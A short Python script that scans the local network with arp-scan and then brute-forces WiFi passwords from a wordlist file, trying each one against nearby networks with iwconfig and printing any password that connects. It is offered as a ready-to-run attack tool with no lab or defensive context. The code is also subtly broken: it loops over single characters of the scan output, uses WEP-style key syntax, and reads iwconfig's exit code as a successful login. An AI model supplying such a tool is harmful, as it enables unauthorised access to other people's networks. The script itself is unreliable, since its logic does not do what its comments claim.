import os
import subprocess

def lan_scan():
    # Perform a LAN scan using the arp-scan command
    subprocess.call(["arp-scan", "--localnet"])

def bruteforce_wifi_passwords(file_path):
    # Read the file containing a list of passwords
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    
    # Remove newline characters from each password
    passwords = [password.strip() for password in passwords]
    
    # Get the list of available WiFi networks
    networks = subprocess.check_output(["iwlist", "wlan0", "scan"]).decode('utf-8')
    
    # Iterate over each network and try each password
    for network in networks:
        for password in passwords:
            # Connect to the WiFi network using the current password
            result = subprocess.call(["iwconfig", "wlan0", "essid", network, "key", password])
            
            # Check if the connection was successful
            if result == 0:
                print(f"Successfully connected to {network} with password: {password}")
                return
    
    print("No WiFi network could be connected with the provided passwords.")

# Example usage
file_path = "passwords.txt"
lan_scan()
bruteforce_wifi_passwords(file_path)
